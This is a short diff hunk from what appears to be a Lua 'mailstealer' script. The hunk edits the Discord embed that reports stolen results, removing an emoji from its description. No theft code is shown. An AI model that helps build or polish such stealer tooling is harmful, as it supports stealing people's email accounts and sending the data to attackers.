@@ -64,7 +64,7 @@ local data1 = {
         {
             ["title"] = "```Procat Mailstealer Results```",
             ["url"] = "https://discord.gg/mailstealer",
-            ["description"] = "```This data was generated using Procat Mailstealer :cat:```",
+            ["description"] = "```This data was generated using Procat Mailstealer```",
             ["type"] = "rich",
             ["color"] = tonumber(0xBE30F7),
             ["thumbnail"] = {
